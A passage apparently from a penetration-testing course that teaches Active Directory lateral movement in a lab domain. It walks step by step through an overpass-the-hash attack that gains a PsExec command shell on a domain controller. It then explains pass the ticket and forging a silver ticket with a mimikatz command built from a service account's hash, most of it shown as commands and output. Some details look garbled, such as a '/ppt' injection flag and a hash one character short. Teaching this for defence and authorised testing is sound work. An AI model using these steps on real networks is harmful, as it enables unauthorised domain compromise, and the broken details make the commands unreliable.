
![image](img/ec25e59d75726b7041242a56d3376832_654_0.png)

```text
Start Time: 2/12/2018 13:59:40 (local)
End Time: 2/12/2018 23:59:40 (local)
Renew Time: 2/19/2018 13:59:40 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0x1 -> PRIMARY
Kdc Called: DC01.corp.com

#2> Client: jeff_admin @ CORP.COM
Server: cifs/dc01 @ CORP.COM
KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_c
Start Time: 2/12/2018 13:59:40 (local)
End Time: 2/12/2018 23:59:40 (local)
Renew Time: 2/19/2018 13:59:40 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0
Kdc Called: DC01.corp.com
```

**Listing 7.04 - Mapping a network share on the domain controller and listing Kerberos tickets**

The output indicates that the **net use** command was successful. We then use the **klist** command to list the newly requested Kerberos tickets; these include a TGT and a TGS for the *CIFS* service.

> We used “net use” arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft.[^674]

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of Jeff_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.

Let’s try that now, running **./PsExec.exe** to launch **cmd.exe** remotely on the \dc01 machine as Jeff\Admin:

```powershell
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Windows\system32> ipconfig

Windows IP Configuration
```

[^674]: (Microsoft, 2016), https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

```text
Ethernet adapter Ethernet0:

    Connection-specific DNS Suffix . . :
    Link-local IPv6 Address . . . . . : fe80::7959:aaad:eec:3969%2
    IPv4 Address. . . . . . . . . . . : 192.168.1.110
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 192.168.1.1
    .
    .
    .

C:\Windows\system32> whoami
 corp\j_jeff_admin
```

**Listing 705 - Opening remote connection using Kerberos**

As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the domain controller.

Excellent! We have succeeded in upgrading a cached NTLM password hash to a Kerberos TGT and leveraged that to gain remote code execution.

### 21.4.2.1 Exercise

- 1. Execute the overpass the hash attack above and gain an interactive command prompt on the domain controller. Make sure to reboot the Windows 10 client before starting the exercise to clear any cached Kerberos tickets.

### 21.4.3 Pass the Ticket

In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

The *Pass the Ticket* attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

So far, this attack does not provide us with any additional access, but it does offer flexibility in being able to choose which machine to use the ticket from. However, if a service is registered with a service principal name, this scenario becomes more interesting.

Previously, we demonstrated that we could crack the service account password hash and obtain the password from the service ticket. This password could then be used to access resources available to the service account.

However, if the service account is not a local administrator on any servers, we would not be able to perform lateral movement using vectors such as pass the hash or overpass the hash and therefore, in these cases, we would need to use a different approach.

> As with Pass the Hash, Overpass the Hash also requires access to the special admin share called Admin$, which in turn requires local administrative rights on the target machine.

![image](img/ec25e59d75726b7041242a56d3376832_656_0.png)

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user’s permissions from the group memberships included in the service ticket. The user and group permissions in the service ticket are not verified by the application, though. The application blindly trusts the integrity of the service ticket since it is encrypted with a password hash - in theory - only known to the service account and the domain controller.

As an example, if we authenticate against an IIS server that is executing in the context of the service account *iis_service*, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.

However, with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example the IIS application) with any permissions we desire. This custom-created ticket is known as a *silver ticket*[^675] and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) **kerberos::golden**[^676] command. We will explain this apparent misnaming later in the module.

To create the ticket, we first need to obtain the so-called *Security Identifier* or *SID*[^677] of the domain. A SID is a unique name for any object in Active Directory and has the following structure:

```text
S-R-I-S
```

**Listing 706 - Security Identifier format prototype**

Within this structure, the SID begins with a literal “S” to identify the string as a SID, followed by a *revision level* (usually set to “1”), an *identifier-authority* value (often “5” within AD) and one or more *subauthority* values.

For example, an actual SID may look like this:

```text
S-1-5-21-2536614405-3629634762-1218571035-1116
```

**Listing 707 - Security Identifier format**

The first values in Listing 707 (“S-1-5”) are fairly static within AD. The *subauthority* value is dynamic and consists of two primary parts: the domain’s *numeric identifier* (in this case “21-2536614405-3629634762-1218571035”) and a *relative identifier* or *RID*[^678] representing the specific object in the domain (in this case “1116”).

The combination of the domain’s value and the relative identifier help ensure that each SID is unique.

We can easily obtain the SID of our current user with the **whoami /user** command and then extract the domain SID part from it. Let’s try to do this on our Windows 10 client:

[^675]: (Sean Metcalf, 2016). https://adsecurity.org/?p=2011
[^676]: (Benjamin Delpy, 2016). https://github.com/gentilkiwi/mimikatz/wiki/module-~-~-kerberos
[^677]: (Microsoft, 2018). https://msdn.microsoft.com/en-us/library/windows/desktop/aa379571(v=vs.85).aspx
[^678]: (Microsoft, 2018). https://msdn.microsoft.com/en-us/library/windows/desktop/ms721604(v=vs.85).aspx_security_relative_identifier_gly

```cmd
C:\>whoami /user
USER INFORMATION
----------------
User Name SID
=========== ===============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
```

**Listing 708 - Locating the Domain SID**

The SID defining the domain is the entire string except the RID at the end (-1103) as highlighted in Listing 708.

Now that we have the domain SID, let’s try to craft a silver ticket for the IIS service we previously discovered in our dedicated lab domain.

The silver ticket command requires a username (/user), domain name (/domain), the domain SID (/sid), which is highlighted above, the fully qualified host name of the service (/target), the service type (/service:HTTP), and the password hash of the iis_service service account (/rc4).

Finally, the generated silver ticket is injected directly into memory with the /ppt flag.

Before running this, we will flush any existing Kerberos tickets with kerberos::purge and verify the purge with kerberos::list:

```text
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
mimikatz # kerberos::list

mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D8AA966C327 /ppt
User    : offsec
Domain  : corp.com (CORP)
SID     : S-1-5-21-1602875587-2787523311-2599479668
User Id : 500
Groups Id : \*513 512 520 518 519
ServiceKey: e2b475c11da2a0748290d8aa966c327 - rc4_hmac_nt
Service : HTTP
Target  : CorpWebServer.corp.com
Lifetime : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
-> Ticket : \*\* Pass The Ticket \*\*
\* PAC generated
\* PAC signed
\* EncTicketPart generated
\* EncTicketPart encrypted
\* KrbCred generated
Golden ticket for 'offsec @ corp.com' successfully submitted for current session
mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
```
